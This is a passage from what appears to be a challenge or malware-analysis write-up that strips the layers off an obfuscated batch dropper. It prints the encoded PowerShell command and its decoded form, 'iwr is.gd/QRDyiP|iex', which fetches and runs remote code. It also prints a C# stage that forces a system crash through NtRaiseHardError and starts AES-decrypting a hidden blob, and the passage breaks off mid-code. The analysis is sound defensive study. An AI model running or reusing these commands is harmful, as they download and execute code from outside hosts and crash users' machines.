</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">let</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">match</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">line</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">matchAll</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-regexp z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">/</span>%<span class="z-meta z-group z-regexp"><span class="z-punctuation z-definition z-group z-regexp">(</span><span class="z-constant z-other z-character-class z-set z-regexp"><span class="z-punctuation z-definition z-character-class z-regexp">[</span><span class="z-constant z-other z-character-class z-range z-regexp">a-z</span><span class="z-punctuation z-definition z-character-class z-regexp">]</span></span><span class="z-keyword z-operator z-quantifier z-regexp">{1,2}</span><span class="z-punctuation z-definition z-group z-regexp">)</span></span>%<span class="z-punctuation z-definition z-string z-end z-ts">/</span><span class="z-keyword z-other z-ts">g</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-whitespace z-comment z-leading z-ts">    </span><span class="z-comment z-line z-double-slash z-ts"><span class="z-punctuation z-definition z-comment z-ts">//</span></span><span class="z-comment z-line z-double-slash z-ts"> Replace with the matching mapped char</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-keyword z-control z-loop z-ts">for</span> <span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">m</span></span> </span></span><span class="z-keyword z-operator z-expression z-of z-ts">of</span> <span class="z-variable z-other z-readwrite z-ts">match</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">		<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-array-binding-pattern-variable z-ts"><span class="z-punctuation z-definition z-binding-pattern z-array z-ts">[</span><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">_</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">prefix</span></span><span class="z-punctuation z-definition z-binding-pattern z-array z-ts">]</span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-readwrite z-ts">m</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">		<span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">mapped</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-readwrite z-ts">mappings</span><span class="z-meta z-array z-literal z-ts"><span class="z-meta z-brace z-square z-ts">[</span><span class="z-variable z-other z-readwrite z-ts">prefix</span><span class="z-meta z-brace z-square z-ts">]</span></span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">		<span class="z-keyword z-control z-conditional z-ts">if</span> <span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">mapped</span> <span class="z-keyword z-operator z-comparison z-ts">!==</span> <span class="z-constant z-language z-undefined z-ts">undefined</span><span class="z-meta z-brace z-round z-ts">)</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">			<span class="z-variable z-other z-readwrite z-ts">line</span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">line</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-ts">replace</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-template z-ts"><span class="z-punctuation z-definition z-string z-template z-begin z-ts">`</span>%<span class="z-meta z-template z-expression z-ts"><span class="z-punctuation z-definition z-template-expression z-begin z-ts">${</span></span><span class="z-meta z-template z-expression z-ts"><span class="z-meta z-embedded z-line z-ts"><span class="z-variable z-other z-readwrite z-ts">prefix</span></span><span class="z-punctuation z-definition z-template-expression z-end z-ts">}</span></span>%<span class="z-punctuation z-definition z-string z-template z-end z-ts">`</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-variable z-other z-readwrite z-ts">mapped</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">		<span class="z-punctuation z-definition z-block z-ts">}</span></span>
</span></span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-block z-ts">	<span class="z-punctuation z-definition z-block z-ts">}</span></span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts">	<span class="z-variable z-other z-readwrite z-ts">res</span> <span class="z-keyword z-operator z-assignment z-compound z-ts">+=</span> <span class="z-variable z-other z-readwrite z-ts">line</span> <span class="z-keyword z-operator z-arithmetic z-ts">+</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span><span class="z-constant z-character z-escape z-ts">\n</span><span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></span><span class="z-source z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-support z-class z-console z-ts">console</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-console z-ts">log</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">res</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></code></pre><p>Running this and we get another file full of junk:<pre class="language-cmd z-code" data-lang=cmd><code class=language-cmd data-lang=cmd><span class="z-source z-dosbatch"><span class="z-keyword z-command z-rem z-dosbatch">rem</span><span class="z-comment z-line z-rem z-dosbatch"> set yjchhfxckpteverppmhztkiqhhpehqjgvzpglozcjzxxczmkhrww=yvrclcqlfnfpxmcwpqpjsdybfvggxacsfacvjpcliuwpzbzroenqawfxrc</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-rem z-dosbatch">rem</span><span class="z-comment z-line z-rem z-dosbatch"> set fzhnusjekleyyjbpzlmygwjvtqwvtgqwdjssqpncuqytnfijbqribyhkmmdhxq=jsqpyyljkjmwxxnkqvvnemyxwtgpobiljbkxuozgtrqdnydgtltwo</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-comment z-line z-colon z-dosbatch"><span class="z-punctuation z-definition z-comment z-dosbatch">::</span> set urfroegmtkpfqis=verfnkrbhcmiajaezhqb</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">jpyqlchzcuzgmjsahxjxenltfpdygmdkztrzqouxkdfwkewypaiwxvhyyoncafjbqfsh</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">dbvxggytlrfvtl</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">rmdybvgurqrxfqmhbseysiyiqauksottklgaitbij</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">xvoapkvhtwrwvrylzgbsxjmtgxymdgjs</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-rem z-dosbatch">rem</span><span class="z-comment z-line z-rem z-dosbatch"> set syuzveatifikhhcdvsavncalizphjsukxggujlvfqn=eclazgecomzdgvl</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">ftzoy</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">syywqkwsdqxvzkidymdrijcp</span>
</span><span class="z-source z-dosbatch">powershell -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA<span class="z-keyword z-operator z-comparison z-dosbatch">==</span>
</span><span class="z-source z-dosbatch"><span class="z-comment z-line z-colon z-dosbatch"><span class="z-punctuation z-definition z-comment z-dosbatch">::</span> set urfroegmtkpfqis=verfnkrbhcmiajaezhqb</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-comment z-line z-colon z-dosbatch"><span class="z-punctuation z-definition z-comment z-dosbatch">::</span> set xwrahrcbwcgcuoktrepnxfevexhydmxconsixmyyqigr=izvzf</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">rmdybvgurqrxfqmhbseysiyiqauksottklgaitbij</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">xvoapkvhtwrwvrylzgbsxjmtgxymdgjs</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">qhpjorldrymwegzawcstabkrryxcnflhkropseifrzxwwxdpz</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">plobsfozpdbdkzadbscqzmunzqawmuikgfrvvy</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">cbatydmrbkgqjtmgcdpyytxqbjxj</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">esguhttobrtqjcfesywmllbvytnpcqym</span>
</span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-rem z-dosbatch">rem</span><span class="z-comment z-line z-rem z-dosbatch"> set yjchhfxckpteverppmhztkiqhhpehqjgvzpglozcjzxxczmkhrww=yvrclcqlfnfpxmcwpqpjsdybfvggxacsfacvjpcliuwpzbzroenqawfxrc</span><span class="z-comment z-line z-rem z-dosbatch">
</span></span><span class="z-source z-dosbatch"><span class="z-keyword z-command z-dosbatch">set</span> <span class="z-variable z-other z-readwrite z-dosbatch">ftzoy</span><span class="z-keyword z-operator z-assignment z-dosbatch">=</span><span class="z-string z-unquoted z-dosbatch">syywqkwsdqxvzkidymdrijcp</span>
</span></code></pre><p>All the lines starting with <code>rem</code> or <code>::</code> are comments so we can safely ignore them, the one that seems interesting is:<pre class="language-cmd z-code" data-lang=cmd><code class=language-cmd data-lang=cmd><span class="z-source z-dosbatch">powershell -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA<span class="z-keyword z-operator z-comparison z-dosbatch">==</span>
</span></code></pre><p>Another round of base64 decoding:<pre class="language-bash z-code" data-lang=bash><code class=language-bash data-lang=bash><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">"</span>aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==<span class="z-punctuation z-definition z-string z-end z-shell">"</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">base64</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span></span>
</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> iwr is.gd/QRDyiP|iex</span><span class="z-comment z-line z-number-sign z-shell">
</span></span></code></pre><p>You know what's next, <code>curl</code>-it. We now get a CSharp program that is being compiled and ran. A little formatting so that our eyes stop bleeding from this oneliner:<pre class="language-cs z-code" data-lang=cs><code class=language-cs data-lang=cs><span class="z-source z-cs"><span class="z-keyword z-control z-import z-cs">using</span> <span class="z-meta z-path z-cs">System</span><span class="z-punctuation z-terminator z-cs">;</span>
</span><span class="z-source z-cs"><span class="z-keyword z-control z-import z-cs">using</span> <span class="z-meta z-path z-cs">System</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">Text</span><span class="z-punctuation z-terminator z-cs">;</span>
</span><span class="z-source z-cs"><span class="z-keyword z-control z-import z-cs">using</span> <span class="z-meta z-path z-cs">System</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">Security</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">Cryptography</span><span class="z-punctuation z-terminator z-cs">;</span>
</span><span class="z-source z-cs"><span class="z-keyword z-control z-import z-cs">using</span> <span class="z-meta z-path z-cs">System</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">Runtime</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">InteropServices</span><span class="z-punctuation z-terminator z-cs">;</span>
</span><span class="z-source z-cs"><span class="z-keyword z-control z-import z-cs">using</span> <span class="z-meta z-path z-cs">System</span><span class="z-punctuation z-separator z-namespace z-cs">.</span><span class="z-meta z-path z-cs">IO</span><span class="z-punctuation z-terminator z-cs">;</span>
</span><span class="z-source z-cs">
</span><span class="z-source z-cs"><span class="z-storage z-modifier z-access z-cs">public</span> <span class="z-meta z-class z-cs"><span class="z-storage z-type z-class z-cs">class</span> <span class="z-entity z-name z-class z-cs">X</span>
</span></span><span class="z-source z-cs"><span class="z-meta z-class z-cs"></span><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-punctuation z-section z-block z-begin z-cs">{</span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-meta z-annotation z-cs"><span class="z-punctuation z-definition z-annotation z-begin z-cs">[</span><span class="z-variable z-annotation z-cs">DllImport</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-annotation z-cs"><span class="z-meta z-group z-cs"><span class="z-string z-quoted z-double z-cs"><span class="z-punctuation z-definition z-string z-begin z-cs">"</span>ntdll.dll<span class="z-punctuation z-definition z-string z-end z-cs">"</span></span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-annotation z-cs"><span class="z-punctuation z-definition z-annotation z-end z-cs">]</span></span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-storage z-modifier z-access z-cs">public</span> <span class="z-storage z-modifier z-cs">static</span> <span class="z-storage z-modifier z-cs">extern</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-meta z-method z-cs"><span class="z-entity z-name z-function z-cs">RtlAdjustPrivilege</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-begin z-cs">(</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-storage z-type z-cs">int</span> <span class="z-variable z-parameter z-cs">p</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-type z-cs">bool</span> <span class="z-variable z-parameter z-cs">e</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-type z-cs">bool</span> <span class="z-variable z-parameter z-cs">c</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-modifier z-parameter z-cs">out</span> <span class="z-storage z-type z-cs">bool</span> <span class="z-variable z-parameter z-cs">o</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-end z-cs">)</span></span><span class="z-meta z-method z-cs"><span class="z-punctuation z-terminator z-cs">;</span></span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-meta z-annotation z-cs"><span class="z-punctuation z-definition z-annotation z-begin z-cs">[</span><span class="z-variable z-annotation z-cs">DllImport</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-annotation z-cs"><span class="z-meta z-group z-cs"><span class="z-string z-quoted z-double z-cs"><span class="z-punctuation z-definition z-string z-begin z-cs">"</span>ntdll.dll<span class="z-punctuation z-definition z-string z-end z-cs">"</span></span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-annotation z-cs"><span class="z-punctuation z-definition z-annotation z-end z-cs">]</span></span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-storage z-modifier z-access z-cs">public</span> <span class="z-storage z-modifier z-cs">static</span> <span class="z-storage z-modifier z-cs">extern</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-meta z-method z-cs"><span class="z-entity z-name z-function z-cs">NtRaiseHardError</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-begin z-cs">(</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-parameter z-cs">e</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-parameter z-cs">n</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-parameter z-cs">u</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-support z-type z-cs">IntPtr</span> <span class="z-variable z-parameter z-cs">p</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-parameter z-cs">v</span><span class="z-punctuation z-separator z-parameter z-function z-cs">,</span> <span class="z-storage z-modifier z-parameter z-cs">out</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-parameter z-cs">r</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-end z-cs">)</span></span><span class="z-meta z-method z-cs"><span class="z-punctuation z-terminator z-cs">;</span></span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-storage z-modifier z-access z-cs">public</span> <span class="z-storage z-modifier z-cs">static</span> <span class="z-storage z-modifier z-cs">unsafe</span> <span class="z-storage z-type z-cs">string</span> <span class="z-meta z-method z-cs"><span class="z-entity z-name z-function z-cs">Shot</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-begin z-cs">(</span></span><span class="z-meta z-method z-parameters z-cs"><span class="z-punctuation z-section z-parameters z-end z-cs">)</span></span><span class="z-meta z-method z-cs">
</span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-cs">    </span><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-punctuation z-section z-block z-begin z-cs">{</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-storage z-type z-cs">bool</span> <span class="z-variable z-other z-cs">o</span><span class="z-punctuation z-terminator z-statement z-cs">;</span> <span class="z-storage z-type z-cs">uint</span> <span class="z-variable z-other z-cs">r</span><span class="z-punctuation z-terminator z-statement z-cs">;</span> <span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">RtlAdjustPrivilege</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-constant z-numeric z-integer z-decimal z-cs">19</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-constant z-language z-cs">true</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-constant z-language z-cs">false</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-storage z-modifier z-argument z-cs">out</span> <span class="z-variable z-other z-cs">o</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">NtRaiseHardError</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-constant z-numeric z-integer z-hexadecimal z-cs"><span class="z-punctuation z-definition z-numeric z-base z-cs">0x</span>c0000022</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-constant z-numeric z-integer z-decimal z-cs">0</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-constant z-numeric z-integer z-decimal z-cs">0</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-variable z-other z-cs">IntPtr</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">Zero</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-constant z-numeric z-integer z-decimal z-cs">6</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-storage z-modifier z-argument z-cs">out</span> <span class="z-variable z-other z-cs">r</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-storage z-type z-cs">byte</span><span class="z-meta z-brackets z-cs"><span class="z-punctuation z-section z-brackets z-begin z-cs">[</span><span class="z-punctuation z-section z-brackets z-end z-cs">]</span></span> <span class="z-variable z-other z-cs">c</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-variable z-other z-cs">Convert</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">FromBase64String</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-string z-quoted z-double z-cs"><span class="z-punctuation z-definition z-string z-begin z-cs">"</span>RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw<span class="z-punctuation z-definition z-string z-end z-cs">"</span></span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-storage z-type z-cs">byte</span><span class="z-meta z-brackets z-cs"><span class="z-punctuation z-section z-brackets z-begin z-cs">[</span><span class="z-punctuation z-section z-brackets z-end z-cs">]</span></span> <span class="z-variable z-other z-cs">k</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-variable z-other z-cs">Convert</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">FromBase64String</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-string z-quoted z-double z-cs"><span class="z-punctuation z-definition z-string z-begin z-cs">"</span>/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=<span class="z-punctuation z-definition z-string z-end z-cs">"</span></span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-storage z-type z-cs">byte</span><span class="z-meta z-brackets z-cs"><span class="z-punctuation z-section z-brackets z-begin z-cs">[</span><span class="z-punctuation z-section z-brackets z-end z-cs">]</span></span> <span class="z-variable z-other z-cs">i</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-variable z-other z-cs">Convert</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">FromBase64String</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-string z-quoted z-double z-cs"><span class="z-punctuation z-definition z-string z-begin z-cs">"</span>9sXGmK4q9LdYFdOp4TSsQw==<span class="z-punctuation z-definition z-string z-end z-cs">"</span></span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-keyword z-control z-using z-cs">using</span> <span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span><span class="z-meta z-group z-cs"><span class="z-support z-type z-cs">Aes</span> <span class="z-variable z-other z-cs">a</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-variable z-other z-cs">Aes</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">Create</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">        <span class="z-meta z-block z-cs"><span class="z-punctuation z-section z-block z-begin z-cs">{</span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-variable z-other z-cs">a</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">Key</span> <span class="z-keyword z-operator z-assignment z-cs">=</span> <span class="z-variable z-other z-cs">k</span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-variable z-other z-cs">a</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">IV</span> <span class="z-keyword z-operator z-assignment z-cs">=</span> <span class="z-variable z-other z-cs">i</span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
